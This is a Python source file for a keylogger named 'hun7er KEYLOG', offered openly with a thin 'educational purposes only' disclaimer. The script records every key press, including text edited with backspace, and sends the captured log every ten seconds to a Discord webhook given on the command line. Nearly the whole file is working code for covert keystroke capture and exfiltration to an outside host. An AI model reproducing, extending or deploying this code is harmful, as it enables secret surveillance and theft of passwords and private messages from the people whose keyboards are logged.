#_______________________________________________________________________________________
#    __             _____             __ __ ________  ____    ____  ______              |
#   / /_  __  _____/__  /__  _____   / //_// ____/\ \/ / /   / __ \/ ____/              |
#  / __ \/ / / / __ \/ / _ \/ ___/  / ,<  / __/    \  / /   / / / / / __                |
# / / / / /_/ / / / / /  __/ /     / /| |/ /___    / / /___/ /_/ / /_/ /                |
#/_/ /_/\__,_/_/ /_/_/\___/_/     /_/ |_/_____/   /_/_____/\____/\____/                 |
#                                                                                       |
# Github : https://github.com/hun7er-py                                                 |
#                                                                                       |
# For educational purposes only. Please do not use for malicious means                  |                                                                                |
#_______________________________________________________________________________________|


#importing the necessary modules

import keyboard
from threading import Timer
from nextcord import SyncWebhook
import json
import requests
import sys

#_____________________________________________________________________________

SEND_REPORT_EVERY = 10# in seconds. Self explanatory.
WEBHOOK_URL = "" #webhook url, preferably Discord

#_____________________________________________________________________________

class Keylogger:
    def __init__(self, interval, url):
        #take the arguments and put them in class-scoped variables
        self.interval = interval
        self.log = ""
        self.url = url

    #callback happens when a key in pressed with the import of keyboard
    #the callback method has 1 argument, event (which will be for exampel keyboard.Key.enter, with the name being enter)
    def callback(self, event):
        #we need to take the name of the key pressed in a string format
        name = event.name 
        #if the length of the name is bigger than 1, it means it's not a letter or number, but a function/mod key
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "tab":
                name == "\t"
            elif name == "backspace" and len(self.log) == 0:
                #since there is nothing in the log, we cant delete anything, but we need to put the capture to NULL
                name = "" 
            elif name == "backspace" and len(self.log) > 0:
                #we delete the last entry in our logs
                self.log = self.log[:-1] 
                name = ""
            #other keys like shift, control etc will be NULL and not included.
            else: 
                name = "" 
        #append the capture to our log
        self.log += name 

    #reporting the lgos
    def report(self):
        #first we have to check if the log is empty or not. Suprise! You can't send empty (meaning NULL) messages to a webhook.
        if self.log:
            #make a new webhook object with our url
            webhook = SyncWebhook.from_url(self.url)
            #send the current log string 
            webhook.send(self.log) 
        #resetting the log string
        self.log = "" 
        #defining a new timer with our interval and pointing to this function, so it only executes every <interval> seconds
        timer = Timer(interval=self.interval, function=self.report) 
        #keeps on going
        timer.daemon = True
        # start the timer 
        timer.start() 


    def start(self):
        # start the keylogger
        keyboard.on_press(callback=self.callback)#also possible with the .on_release, however we found skipped inputs in our final logs
        #report the log
        self.report()
        #wait for keyboard input
        keyboard.wait()

#main method, will create a keylogger that will handle the rest
def main(argv):
    #make new Keylogger object with our specifications (the report interval and report webhook)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, url=argv) 
    #starting the keylogger)
    keylogger.start() 

#Here we're handling the call to our script
if __name__ == "__main__":
    try:
        #argument will need to be the webhook url. 
        main(sys.argv[1]) 

    except:
        #in case there is an error (most likely because of the absence of a valid URL)
        print("Please provide a valid webhook URL and use it like this : \n python3 logger.py/.exe <webhookurl>") 
